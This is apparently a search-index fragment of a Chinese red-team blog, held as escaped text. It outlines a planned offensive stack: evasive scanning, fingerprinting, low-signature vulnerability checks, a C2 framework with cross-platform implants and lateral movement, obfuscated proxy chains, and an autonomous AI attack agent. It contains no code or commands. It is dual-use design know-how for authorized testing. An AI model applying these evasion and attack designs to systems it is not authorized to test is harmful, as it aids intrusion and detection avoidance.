Agent\u53ef\u7528\u7684\u5177\u6709\u5b9e\u6218\u610f\u4e49\u7684\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\u3002</p>"},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#\u6838\u5fc3\u80fd\u529b","title":"\u6838\u5fc3\u80fd\u529b","text":""},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#\u626b\u63cf\u5668","title":"\u626b\u63cf\u5668","text":"<p>\u8bbe\u8ba1\u601d\u8def\uff1a\u57fa\u4e8e\u81ea\u52a8\u5316\u5f15\u64ce\u7406\u5ff5\uff0c\u5b9e\u73b0\u9ad8\u6027\u80fd\u3001\u53ef\u63a7\u3001\u53ef\u62d3\u5c55\u7684\u626b\u63cf\u80fd\u529b\u3002\u91c7\u7528\u6a21\u5757\u5316\u8bbe\u8ba1\uff0c\u5c06\u7f51\u6bb5\u63a2\u6d4b\u3001\u7aef\u53e3\u626b\u63cf\u3001\u6307\u7eb9\u8bc6\u522b\u548cPOC\u9a8c\u8bc1\u6574\u5408\u4e3a\u4e00\u6761\u5b8c\u6574\u7684\u6d41\u6c34\u7ebf\u3002</p> <p>\u6838\u5fc3\u80fd\u529b\uff1a - \u4efb\u52a1\u751f\u6210\u5668\uff1a\u901a\u8fc7\u4e30\u5bcc\u53c2\u6570\u63a7\u5236\u626b\u63cf\u7b56\u7565\uff0c\u9002\u5e94\u4e0d\u540c\u73af\u5883\u548c\u89c4\u907f\u9632\u62a4\u8bbe\u5907 - \u4fe1\u606f\u6536\u96c6\u5668\uff1a\u4ee5\u6700\u5c11\u53d1\u5305\u91cf\u6536\u96c6\u6700\u591a\u57fa\u7840\u4fe1\u606f\uff0c\u652f\u6301\u6570\u636e\u63d0\u53d6 - \u9ad8\u5e76\u53d1\u6027\u80fd\uff1a\u57fa\u4e8e\u534f\u7a0b\u5b9e\u73b0\uff0c\u6027\u80fd\u8fdc\u8d85\u4f20\u7edf\u591a\u7ebf\u7a0b\u626b\u63cf\u5668 - \u667a\u80fd\u626b\u63cf\uff1a\u6839\u636e\u76ee\u6807\u7279\u5f81\u52a8\u6001\u8c03\u6574\u626b\u63cf\u7b56\u7565\uff0c\u907f\u514d\u88abban\u548c\u89e6\u53d1\u9632\u62a4 - \u591a\u534f\u8bae\u652f\u6301\uff1aTCP\u3001UDP\u3001ICMP\u7b49\u591a\u79cd\u534f\u8bae\u7684\u63a2\u6d4b\u80fd\u529b</p>"},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#\u6307\u7eb9\u8bc6\u522b","title":"\u6307\u7eb9\u8bc6\u522b","text":"<p>\u8bbe\u8ba1\u601d\u8def\uff1a\u57fa\u4e8efingers\u591a\u5f15\u64ce\u67b6\u6784\uff0c\u6574\u5408\u591a\u4e2a\u6307\u7eb9\u5e93\u7684\u8bc6\u522b\u80fd\u529b\uff0c\u5b9e\u73b0\u4e00\u6b21\u626b\u63cf\u591a\u5e93\u5339\u914d\u3002\u901a\u8fc7CPE\u6807\u51c6\u5316\u547d\u540d\u89e3\u51b3\u6307\u7eb9\u5e93\u95f4\u7684\u5dee\u5f02\u95ee\u9898\uff0c\u4e3a\u540e\u7eed\u6f0f\u6d1e\u5339\u914d\u5960\u5b9a\u57fa\u7840\u3002</p> <p>\u6838\u5fc3\u80fd\u529b\uff1a - \u591a\u6307\u7eb9\u5e93\u652f\u6301\uff1a\u6574\u5408wappalyzer\u3001fingerprinthub\u3001ehole\u3001goby\u7b49\u4e3b\u6d41\u6307\u7eb9\u5e93 - \u88ab\u52a8\u4e0e\u4e3b\u52a8\u8bc6\u522b\uff1aHTTP/TCP\u534f\u8bae\u7684\u88ab\u52a8\u6307\u7eb9+\u4e3b\u52a8\u63a2\u9488\u76f8\u7ed3\u5408 - \u7248\u672c\u4fe1\u606f\u63d0\u53d6\uff1a\u4e0d\u4ec5\u8bc6\u522b\u4ea7\u54c1\u7c7b\u578b\uff0c\u8fd8\u80fd\u63d0\u53d6\u7248\u672c\u53f7\u7b49\u8be6\u7ec6\u4fe1\u606f - \u9ad8\u6027\u80fd\u5f15\u64ce\uff1a\u6b63\u5219\u9884\u7f16\u8bd1\u3001\u7f13\u5b58\u673a\u5236\u3001\u4f18\u5148\u7ea7\u7b97\u6cd5\u4f18\u5316\u6027\u80fd - \u6807\u51c6\u5316\u8f93\u51fa\uff1a\u57fa\u4e8eCPE\u89c4\u8303\u5b9e\u73b0\u6307\u7eb9\u6807\u51c6\u5316\uff0c\u4fbf\u4e8e\u4e0e\u6f0f\u6d1e\u5e93\u5173\u8054</p>"},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#\u6f0f\u6d1e\u9a8c\u8bc1","title":"\u6f0f\u6d1e\u9a8c\u8bc1","text":"<p>\u8bbe\u8ba1\u601d\u8def\uff1a\u57fa\u4e8eneutron\u8f7b\u91cf\u7ea7nuclei\u5f15\u64ce\uff0c\u5b9e\u73b0\u9ad8\u517c\u5bb9\u6027\u7684POC\u9a8c\u8bc1\u80fd\u529b\u3002\u91c7\u7528\u6700\u5c0f\u53d1\u5305\u539f\u5219\uff0c\u4f18\u5148\u9a8c\u8bc1\u800c\u975e\u5229\u7528\uff0c\u786e\u4fdd\u5728\u590d\u6742\u73af\u5883\u4e0b\u7684\u7a33\u5b9a\u6027\u548c\u9690\u853d\u6027\u3002</p> <p>\u6838\u5fc3\u80fd\u529b\uff1a - \u8f7b\u91cf\u7ea7\u5f15\u64ce\uff1a\u91cd\u5199nuclei\u6838\u5fc3\u6a21\u5757\uff0c\u53bb\u9664\u5197\u4f59\u529f\u80fd\uff0c\u4fdd\u6301\u9ad8\u517c\u5bb9\u6027 - \u667a\u80fdPOC\u8c03\u5ea6\uff1a\u6839\u636e\u6307\u7eb9\u8bc6\u522b\u7ed3\u679c\u81ea\u52a8\u9009\u62e9\u5bf9\u5e94POC\uff0c\u907f\u514d\u76f2\u76ee\u9a8c\u8bc1 - \u517c\u5bb9nuclei\u751f\u6001\uff1a\u652f\u6301nuclei v2.*\u768490%\u4ee5\u4e0a\u529f\u80fd\uff0c\u53ef\u5feb\u901f\u79fb\u690dPOC - \u4f4e\u7279\u5f81\u9a8c\u8bc1\uff1a\u8ffd\u6c42\u6700\u5c0f\u53d1\u5305\u91cf\u548c\u6700\u4f4e\u68c0\u6d4b\u7279\u5f81 - \u5185\u7f51\u4f18\u5316\uff1a\u4e13\u6ce8\u5185\u7f51\u573a\u666f\u7684\u9ed8\u8ba4\u53e3\u4ee4\u3001RCE\u3001\u4fe1\u606f\u6cc4\u9732\u7b49\u9ad8\u4ef7\u503c\u6f0f\u6d1e</p>"},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#c2","title":"C2","text":"<p>\u8bbe\u8ba1\u601d\u8def\uff1a\u57fa\u4e8eIoM\u4e0b\u4e00\u4ee3C2\u6846\u67b6\uff0c\u91c7\u7528\u9ad8\u5ea6\u89e3\u8026\u7684\u6a21\u5757\u5316\u67b6\u6784\u3002\u652f\u6301\u8de8\u5e73\u53f0(linux, windows,macos)rust implant\u4e00\u7ba1\u7406\uff0c\u901a\u8fc7\u63d2\u4ef6\u5316\u5b9e\u73b0\u529f\u80fd\u62d3\u5c55\u3002</p> <p>\u6838\u5fc3\u80fd\u529b\uff1a - \u591aimplant\u652f\u6301\uff1arust\u539f\u751fimplant\u3001\u7b2c\u4e09\u65b9implant\u63a5\u5165 - \u63d2\u4ef6\u751f\u6001\uff1a\u517c\u5bb9sliver armory\u3001cobaltstrike BOF\u3001\u81ea\u7814dynamic module - \u89e3\u8026\u67b6\u6784\uff1aserver\u3001listener\u3001client\u5b8c\u5168\u89e3\u8026\uff0c\u652f\u6301\u5206\u5e03\u5f0f\u90e8\u7f72 - \u591a\u4fe1\u9053\u901a\u4fe1\uff1aHTTP(S)\u3001TCP\u3001DNS\u7b49\u591a\u79cd\u901a\u4fe1\u4fe1\u9053 - OPSEC\u7279\u6027\uff1a\u6d41\u91cf\u6df7\u6dc6\u3001\u7279\u5f81\u81ea\u5b9a\u4e49\u3001profile\u914d\u7f6e - \u540e\u6e17\u900f\u80fd\u529b\uff1a\u6587\u4ef6\u64cd\u4f5c\u3001\u8fdb\u7a0b\u7ba1\u7406\u3001\u6743\u9650\u63d0\u5347\u3001\u6a2a\u5411\u79fb\u52a8</p>"},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#\u4ee3\u7406","title":"\u4ee3\u7406","text":"<p>\u8bbe\u8ba1\u601d\u8def\uff1a\u57fa\u4e8erem\u4e0b\u4e00\u4ee3\u4ee3\u7406\u6846\u67b6\uff0c\u91cd\u65b0\u8bbe\u8ba1\u7f51\u7edc\u67b6\u6784\u5b9e\u73b0\u590d\u6742\u7684\u6d41\u91cf\u8f6c\u53d1\u548c\u96a7\u9053\u6784\u5efa\u3002\u652f\u6301\u591a\u7ea7\u4ee3\u7406\u3001\u52a0\u5bc6\u6df7\u6dc6\u3001\u534f\u8bae\u8f6c\u6362\u7b49\u9ad8\u7ea7\u7279\u6027\u3002</p> <p>\u6838\u5fc3\u80fd\u529b\uff1a - \u591a\u7ea7\u4ee3\u7406\uff1a\u652f\u6301\u590d\u6742\u7684\u591a\u8df3\u4ee3\u7406\u94fe\u8def\u6784\u5efa - \u534f\u8bae\u652f\u6301\uff1asocks5\u3001http\u3001shadowsocks\u3001trojan\u7b49\u591a\u79cd\u4ee3\u7406\u534f\u8bae - \u6d41\u91cf\u6df7\u6dc6\uff1a\u591a\u5c42\u52a0\u5bc6\u6df7\u6dc6\uff0c\u5bf9\u6297\u6d41\u91cf\u5206\u6790\u548c\u68c0\u6d4b - \u52a8\u6001\u8def\u7531\uff1a\u667a\u80fd\u9009\u62e9\u6700\u4f18\u8def\u5f84\uff0c\u652f\u6301\u8d1f\u8f7d\u5747\u8861\u548c\u6545\u969c\u5207\u6362 - webshell\u4ee3\u7406\uff1a\u652f\u6301neoreg\u3001suo5\u7b49webshell\u4ee3\u7406\u534f\u8bae - SDK\u96c6\u6210\uff1a\u63d0\u4f9bproxyclient\u5e93\uff0c\u4fbf\u4e8e\u5176\u4ed6\u5de5\u5177\u96c6\u6210\u4ee3\u7406\u80fd\u529b</p>"},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#\u6f0f\u6d1e\u5229\u7528","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#todo","title":"todo","text":""},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#webshell","title":"Webshell","text":""},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#todo_1","title":"todo","text":""},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#ai-agent","title":"AI Agent","text":"<p>\u5904\u4e8e\u8c03\u7814\u8bbe\u8ba1\u9636\u6bb5</p> <p>\u4e00\u5f00\u59cb\u60f3\u5b9e\u73b0\u4e00\u4e2aAI for CTEM\u3002 \u8ba9AI\u53bb\u8fdb\u884c\u98ce\u9669\u53d1\u73b0\u4e0e\u98ce\u9669\u7ba1\u7406\u3002 \u4f46\u5728\u4e00\u5468\u7684\u57fa\u7840\u8bbe\u65bd\u5c42\u4ee3\u7801\u5de5\u4f5c\u540e\u3002 \u53d1\u73b0\u5f53\u524d\u7684\u57fa\u7840\u8bbe\u65bd\u5c42\u80fd\u529b\u57fa\u672c\u6765\u81ea\u4e4b\u524d\u9762\u5411\u5b9e\u6218\u7684\u81ea\u52a8\u5316\u6e17\u900f\u3001\u540e\u6e17\u900f\u7cfb\u7edf\u3002 \u5982\u679c\u8981\u5c06\u5176\u6539\u4e3aCTEM\u7684\u5185\u90e8\u5b9e\u73b0\uff0c\u6ee1\u8db3ASM\u4e0eBAS\u7684\u9700\u6c42\uff0c\u53cd\u800c\u9700\u8981\u5bf9\u5176\u80fd\u529b\u8fdb\u884c\u9609\u5272\u3002 \u4f8b\u5982\u67d0\u4e2a\u573a\u666f\uff0c \u6211\u4eec\u53ef\u4ee5\u57fa\u4e8e\u5b8c\u5168\u771f\u5b9e\u7684\u653b\u51fb\u73af\u5883\u5b9e\u73b0\uff0c \u4e5f\u53ef\u4ee5\u57fa\u4e8e\u8fd0\u7ef4\u7ba1\u9053\u5b9e\u73b0\u3002\u90a3BAS\u901a\u5e38\u4f1a\u9009\u62e9\u540e\u8005\uff0c \u540e\u8005\u5b9e\u73b0\u8d77\u6765\u66f4\u52a0\u7b80\u5355\u3002\u4f46\u8fd9\u610f\u5473\u7740\u5bf9\u81ea\u8eab\u80fd\u529b\u7684\u9609\u5272\u3002\u6211\u4eec\u57fa\u4e8eC2\u53bb\u5b9e\u73b0\u540c\u6837\u7684\u529f\u80fd\uff0c\u590d\u6742\u5ea6\u5e76\u4e0d\u4f1a\u9ad8\u5f88\u591a\uff0c\u751a\u81f3\u66f4\u7b80\u5355\u3002</p> <p>\u800c\u5728\u5b9e\u73b0\u57fa\u7840\u8bbe\u65bd\u5c42\u4e0eCTEM\u5c42\u7684\u89e3\u8026\u540e\uff0c \u57fa\u7840\u8bbe\u65bd\u5c42\u63d0\u4f9b\u7684\u662f\u5b8c\u5168\u771f\u5b9e\u7684\u653b\u51fb\u80fd\u529b\u3002 \u90a3\u4e48\u6211\u4eec\u79bb\u653b\u9632\u7684AI Agent \u4e5f\u4e0d\u8fdc\u4e86\u3002 \u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u72ec\u7acb\u7684AI agent\u7cfb\u7edf\uff0c \u5b9e\u73b0\u5927\u91cf\u539f\u672c\u9065\u9065\u65e0\u671f\u7684\u529f\u80fd\u3002</p> <ul> <li> <p>AI \u84dd\u519b\uff0c\u9ed1\u76d2\u89c6\u89d2\u653b\u51fb\u6a21\u62df\u3002\u80fd\u6253HW\uff0c\u7ea2\u84dd\uff0c\u9776\u573a\u3002\u4e00\u4e2a\u9762\u5411real world\u8bbe\u8ba1\u7684\u5177\u6709\u5b9e\u6218\u4ef7\u503c\u7684agent</p> </li> <li> <p>AI \u7d2b\u519b\uff0c \u767d\u76d2\u89c6\u89d2\u653b\u51fb\u6a21\u62df\uff0c \u9047\u5230\u65e0\u6cd5\u8de8\u8d8a\u7684\u6b65\u9aa4\uff0c \u5141\u8bb8\u5176\u901a\u8fc7\u8fd0\u7ef4\u7ba1\u9053\u8df3\u8fc7\u67d0\u4e2a\u6b65\u9aa4\u4f5c\u5f0a\u3002 \u4e5f\u53ef\u4ee5\u4ece\u4efb\u610f\u9636\u6bb5\u4f5c\u4e3a\u8d77\u59cb\u70b9\u3002</p> </li> </ul> <p>AI\u7684\u5b9e\u73b0\u5f62\u5f0f\u5c06\u7c7b\u4f3cclaude code\uff0c \u901a\u8fc7cli\u7684\u65b9\u5f0f\u63d0\u4f9b\u57fa\u7840\u80fd\u529b\uff0c\u65b9\u4fbf\u88ab\u96c6\u6210\u5230\u5404\u79cd\u7cfb\u7edf\u4e2d\u3002\u6bd4\u8d77ide\u4e0eweb ui\u6211\u66f4\u52a0\u503e\u5411\u4e8ecli\uff0c\u4f46\u662f\u5bf9\u4e8e\u9700\u8981\u4eba\u5de5\u4ecb\u5165\u8fdb\u884c\u64cd\u4f5c\u7684\u5de5\u5177\u6765\u8bf4\uff0c cli\u66f4\u52a0\u5951\u5408\u3002</p> <p>AI \u84dd\u519b \u7d2b\u519b\u76ee\u524d\u5c1a\u5904\u4e8e\u7406\u60f3\u72b6\u6001\u3002 \u5f53\u524dAI\u53ef\u4ee5\u7528\u6765\u5b9e\u73b0\uff1a</p> <ul> <li> <p>\u5de5\u4f5c\u6d41\u5b9e\u73b0\u4e86yaml\u7f16\u6392\u5f15\u64ce\uff0c AI\u7528\u6765\u7f16\u6392\u7f16\u6392</p> </li> <li> <p>POC to ability</p> </li> </ul> <p>\u9010\u6b65\u5b9e\u73b0\u5177\u5907\u901a\u7528\u653b\u9632\u80fd\u529b\u7684AI agent</p> <p>Level 1: AI with conversational language capabilities (\u5177\u5907\u5bf9\u8bdd\u8bed\u8a00\u80fd\u529b\u7684 AI)\uff1a \u8fd9\u4e00\u9636\u6bb5\u7684 AI \u4e3b\u8981\u8868\u73b0\u4e3a\u804a\u5929\u673a\u5668\u4eba\uff0c\u80fd\u591f\u8fdb\u884c\u6d41\u7545\u7684\u6587\u672c\u5bf9\u8bdd\uff0c\u7406\u89e3\u5e76\u56de\u5e94\u7528\u6237\u7684\u6307\u4ee4\u3002\u65e9\u671f\u7684 ChatGPT \u4fbf\u662f\u8fd9\u4e00\u9636\u6bb5\u7684\u5178\u578b\u4ee3\u8868\u3002</p> <p>Level 2: AI with human-level problem-solving abilities (\u5177\u5907\u4eba\u7c7b\u6c34\u5e73\u95ee\u9898\u89e3\u51b3\u80fd\u529b\u7684 AI)\uff1a \u5728\u6b64\u9636\u6bb5\uff0cAI \u5f00\u59cb\u5c55\u73b0\u51fa\u66f4\u5f3a\u7684\u63a8\u7406\u80fd\u529b\uff0c\u80fd\u591f\u89e3\u51b3\u590d\u6742\u7684\u6570\u5b66\u548c\u903b\u8f91\u95ee\u9898\u3002\u5b83\u4eec\u4e0d\u518d\u4ec5\u4ec5\u662f\u4fe1\u606f\u68c0\u7d22\u5de5\u5177\uff0c\u800c\u662f\u80fd\u591f\u8fdb\u884c\u6df1\u5ea6\u601d\u8003\u548c\u5206\u6790\u7684\u201c\u63a8\u7406\u8005\u201d\u3002DeepSeek R1 \u662f\u8fd9\u4e00\u9636\u6bb5\u7684\u5178\u578b\u4ee3\u8868\u3002</p> <p>Level 3: Systems that can take actions on behalf of users (\u80fd\u591f\u4ee3\u8868\u7528\u6237\u91c7\u53d6\u884c\u52a8\u7684\u7cfb\u7edf)\uff1a \u8fd9\u4e00\u9636\u6bb5\u7684 AI \u88ab\u79f0\u4e3a\u201c\u667a\u80fd\u4f53\u201d\uff08Agent\uff09\uff0c\u5b83\u4eec\u4e0d\u4ec5\u80fd\u601d\u8003\uff0c\u8fd8\u80fd\u901a\u8fc7\u8c03\u7528\u5de5\u5177\u4e0e\u5916\u90e8\u73af\u5883\u4e92\u52a8\uff0c\u81ea\u4e3b\u5b8c\u6210\u4efb\u52a1\u3002\u4f8b\u5982\uff0c\u901a\u8fc7\u4ee3\u7801\u6267\u884c\u5668\u3001\u6d4f\u89c8\u5668\u7b49\u5de5\u5177\uff0cAI \u80fd\u591f\u6267\u884c\u66f4\u5e7f\u6cdb\u7684\u64cd\u4f5c\u3002\u8fd1\u671f\u5f88\u706b\u70ed\u7684 Manus\u3001Claude Code \u7b49\u5373\u7b26\u5408\u6b64\u9636\u6bb5\u5b9a\u4e49\u3002</p> <p>Level 4: AI that can aid in invention and discovery (\u80fd\u591f\u8f85\u52a9\u53d1\u660e\u548c\u53d1\u73b0\u7684 AI)\uff1a \u8fd9\u4e00\u5c42\u7ea7\u7684 AI \u80fd\u591f\u8fdb\u884c\u66f4\u6df1\u5c42\u6b21\u7684\u521b\u9020\u6027\u5de5\u4f5c\uff0c\u8f85\u52a9\u4eba\u7c7b\u8fdb\u884c\u79d1\u5b66\u7814\u7a76\u3001\u65b0\u6750\u6599\u53d1\u73b0\u7b49\u3002</p> <p>Level 5: AI that can perform the work of an entire organization (\u80fd\u591f\u6267\u884c\u6574\u4e2a\u7ec4\u7ec7\u5de5\u4f5c\u7684 AI)\uff1a \u8fd9\u662f AGI \u7684\u7ec8\u6781\u76ee\u6807\uff0cAI \u80fd\u591f\u50cf\u4e00\u4e2a\u5b8c\u6574\u7684\u7ec4\u7ec7\u4e00\u6837\u8fd0\u4f5c\uff0c\u81ea\u4e3b\u5b8c\u6210\u5404\u9879\u4e1a\u52a1\u6d41\u7a0b\uff0c\u5b9e\u73b0\u5168\u9762\u7684\u667a\u80fd\u5316\u3002</p>"},{"location":"blog/whitepaper/IoM/","title":"Internet of Malice  \u4e0b\u4e00\u4ee3\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\u767d\u76ae\u4e66","text":""},{"location":"blog/whitepaper/IoM/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u5728\u5f53\u4eca\u9ad8\u5ea6\u52a8\u6001\u548c\u590d\u6742\u7684\u7f51\u7edc\u5b89\u5168\u73af\u5883\u4e2d\uff0c\u4f01\u4e1a\u9762\u4e34\u7740\u65e5\u76ca\u589e\u957f\u7684\u9ad8\u7ea7\u5a01\u80c1\uff0c\u4f20\u7edf\u7684\u9632\u5fa1\u6027\u63aa\u65bd\u5df2\u4e0d\u8db3\u4ee5\u5e94\u5bf9\u8fd9\u4e9b\u6311\u6218\u3002\u4e3a\u4e86\u6709\u6548\u5e94\u5bf9\u9ad8\u7ea7\u5a01\u80c1\u884c\u4e3a\u8005\uff08Advanced Persistent Threats, APTs\uff09\u7684\u6218\u672f\u3001\u6280\u672f\u548c\u7a0b\u5e8f\uff08TTPs\uff09\uff0c\u4f01\u4e1a\u84dd\u519b\u9700\u8981\u4e00\u5957\u5148\u8fdb\u7684\u5de5\u5177\u6765\u6a21\u62df\u771f\u5b9e\u7684\u653b\u51fb\u884c\u4e3a\uff0c\u6d4b\u8bd5\u7ec4\u7ec7\u7684\u9632\u5fa1\u80fd\u529b\u5e76\u63d0\u5347\u6574\u4f53\u5b89\u5168\u6001\u52bf\u3002Internet of Malice (IoM) \u5e94\u8fd0\u800c\u751f\uff0c\u4f5c\u4e3a\u4e00\u5957\u4e13\u4e3a\u4f01\u4e1a\u84dd\u519b\u8bbe\u8ba1\u7684\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\u3002</p> <p>\u65e8\u5728\u4e3a\u4f01\u4e1a\u84dd\u519b\u63d0\u4f9b\u4e00\u5957\u6a21\u5757\u5316\u3001\u53ef\u6269\u5c55\u4e14\u6280\u672f\u5148\u8fdb\u7684\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\uff0c\u4ee5\u6a21\u62df\u9ad8\u7ea7\u5a01\u80c1\u884c\u4e3a\u3001\u8bc6\u522b\u9632\u5fa1\u6f0f\u6d1e\u5e76\u63d0\u5347\u7ec4\u7ec7\u7684\u5b89\u5168\u6001\u52bf\u3002</p> <p>IoM \u7684\u6838\u5fc3\u4f7f\u547d\u662f\u901a\u8fc7\u4e00\u4e2a\u5f3a\u5927\u7684\u547d\u4ee4\u4e0e\u63a7\u5236\uff08C2\uff09\u6846\u67b6\uff0c\u5e2e\u52a9\u4f01\u4e1a\u84dd\u519b\u6a21\u62df\u9ad8\u7ea7\u5a01\u80c1\u884c\u4e3a\uff0c\u8bc6\u522b\u6f5c\u5728\u6f0f\u6d1e\uff0c\u5e76\u5236\u5b9a\u66f4\u6709\u6548\u7684\u9632\u5fa1\u7b56\u7565\u3002\u672c\u767d\u76ae\u4e66\u5c06\u8be6\u7ec6\u4ecb\u7ecd IoM \u7684\u8bbe\u8ba1\u7406\u5ff5\u3001\u6280\u672f\u67b6\u6784\u3001\u4e3b\u8981\u529f\u80fd\u53ca\u5176\u5728\u4f01\u4e1a\u7f51\u7edc\u5b89\u5168\u4e2d\u7684\u5e94\u7528\u4ef7\u503c\u3002</p>"},{"location":"blog/whitepaper/IoM/#\u80cc\u666f\u4e0e\u5e02\u573a\u9700\u6c42","title":"\u80cc\u666f\u4e0e\u5e02\u573a\u9700\u6c42","text":""},{"location":"blog/whitepaper/IoM/#\u7f51\u7edc\u5b89\u5168\u5bf9\u6297\u7684\u6f14\u53d8","title":"\u7f51\u7edc\u5b89\u5168\u5bf9\u6297\u7684\u6f14\u53d8","text":"<p>\u73b0\u4ee3\u653b\u9632\u5df2\u4ece\u7406\u8bba\u73af\u5883\u8f6c\u5411\u5b9e\u7f51\u5bf9\u6297\uff0c\u9632\u5b88\u65b9\u901a\u8fc7EDR\u3001NDR\u3001\u96f6\u4fe1\u4efb\u7b49\u6280\u672f\u6784\u5efa\u7eb5\u6df1\u9632\u62a4\u4f53\u7cfb\u3002\u7136\u800c\uff0c\u653b\u51fb\u6a21\u62df\u9886\u57df\u4ecd\u9762\u4e34\u4ee5\u4e0b\u6311\u6218\uff1a  </p> <ol> <li>\u57fa\u7840\u8bbe\u65bd\u788e\u7247\u5316\uff1a\u7ea2\u961f\u9700\u81ea\u7814\u5de5\u5177\u94fe\uff0c\u7f3a\u4e4f\u6807\u51c6\u5316\u3001\u5de5\u7a0b\u5316\u7684\u89e3\u51b3\u65b9\u6848\u3002  </li> <li>\u751f\u6001\u5c01\u95ed\u6027\uff1a\u4e3b\u6d41C2\u6846\u67b6\uff08\u5982CobaltStrike\uff09\u95ed\u6e90\u4e14\u53d7\u9650\u51fa\u53e3\uff0c\u96be\u4ee5\u6ee1\u8db3\u5b9a\u5236\u5316\u9700\u6c42\u3002  </li> <li>\u5bf9\u6297\u80fd\u529b\u4e0d\u8db3\uff1a\u4f20\u7edf\u5de5\u5177\u5728\u7aef\u4e0a\u884c\u4e3a\u9690\u853d\u6027\u3001\u6d41\u91cf\u6df7\u6dc6\u3001\u63d2\u4ef6\u751f\u6001\u7b49\u65b9\u9762\u5b58\u5728\u77ed\u677f\u3002  </li> </ol>"},{"location":"blog/whitepaper/IoM/#c2\u751f\u6001\u7684\u6f14\u53d8","title":"C2\u751f\u6001\u7684\u6f14\u53d8","text":"<p>C2\u5177\u6709\u4e8c\u5341\u591a\u5e74\u7684\u5386\u53f2\uff0c \u6709\u65e0\u6570\u7684\u5185\u90e8/\u5f00\u6e90\u5de5\u5177\u5728\u51fa\u73b0\u8fc7\u3002 \u800c\u6211\u4eec\u603b\u7ed3\u4e86\u524d\u4eba\u7684\u7ecf\u9a8c\uff0c \u5f25\u8865\u4e86\u73b0\u6709\u7684\u7f3a\u9677\uff0c\u4ee5**\u73b0\u4ee3\u7684\u89c6\u89d2\u91cd\u65b0\u8bbe\u8ba1**\u4e86\u4e0b\u4e00\u4ee3\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd</p> <ul> <li>sliver/havoc \u4ee3\u8868\u7684\u5f00\u6e90\u751f\u6001\u7684\u5355\u4e00\u4e14\u6ede\u540e\uff0c \u7edd\u5927\u591a\u6570\u5f00\u6e90\u5de5\u5177\u90fd\u53ea\u652f\u6301\u5355\u4e00\u7684\u62d3\u5c55\u3001\u4ee3\u7801\u9ad8\u5ea6\u8026\u5408\u3001implant\u6280\u672f\u843d\u540e\u3001 \u96be\u4ee5\u4e8c\u5f00\u7b49\u95ee\u9898\u3002</li> <li>cobaltstrike/MSF \u4f5c\u4e3a\u6700\u8001\u724cC2\u5de5\u5177\uff0c \u4ed6\u4eec\u7684\u4e8c\u5f00\u7248\u672c\u81f3\u4eca\u4ecd\u5728\u6d3b\u8dc3\u3002 \u4f46\u4e5f\u9762\u4e34\u4e8c\u5f00\u4e0e\u6700\u65b0\u7248\u672c\u8131\u8282\u3001\u8bbe\u8ba1\u8001\u65e7\u65e0\u6cd5\u5927\u89c4\u6a21\u6539\u52a8\u7684\u95ee\u9898\u3002</li> <li>nighthawk/brc4 \u4ee3\u8868\u4e86\u65b0\u5174\u7684\u5546\u4e1aC2\u5de5\u5177\uff0c \u4ed6\u4eec\u62e5\u6709\u8f83\u597d\u7684OPSEC\u8bbe\u8ba1\u4ee5\u53ca\u6301\u7eed\u8fed\u4ee3\u7ef4\u62a4\u7684\u6280\u672f\u56e2\u961f\u3002 \u4f46\u751f\u6001\u8f83\u4e3a\u5c01\u95ed\uff0c\u7528\u6237\u65e0\u6cd5\u57fa\u4e8e\u6b64\u6c89\u6dc0\u4e3a\u81ea\u5df1\u7684\u57fa\u7840\u8bbe\u65bd\uff0c \u53ea\u80fd\u957f\u671f\u4f9d\u8d56\u4e8e\u7b2c\u4e09\u65b9\u7684\u6280\u672f\u56e2\u961f\u66f4\u65b0\u529f\u80fd\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u4f01\u4e1a\u84dd\u519b\u7684\u9700\u6c42","title":"\u4f01\u4e1a\u84dd\u519b\u7684\u9700\u6c42","text":"<p>\u4f01\u4e1a\u84dd\u519b\u4f5c\u4e3a\u5185\u90e8\u5b89\u5168\u56e2\u961f\u7684\u6838\u5fc3\u7ec4\u6210\u90e8\u5206\uff0c\u80a9\u8d1f\u7740\u6a21\u62df\u653b\u51fb\u3001\u8bc4\u4f30\u9632\u5fa1\u548c\u63d0\u5347\u5b89\u5168\u80fd\u529b\u7684\u91cd\u8981\u804c\u8d23\u3002\u4e3a\u6b64\uff0c\u4ed6\u4eec\u9700\u8981\u7684\u57fa\u7840\u8bbe\u65bd\u5177\u5907\u4ee5\u4e0b\u7279\u6027\uff1a</p> <ul> <li>\u9ad8\u7ea7\u5a01\u80c1\u6a21\u62df\uff1a\u80fd\u591f\u771f\u5b9e\u518d\u73b0 APT \u7684 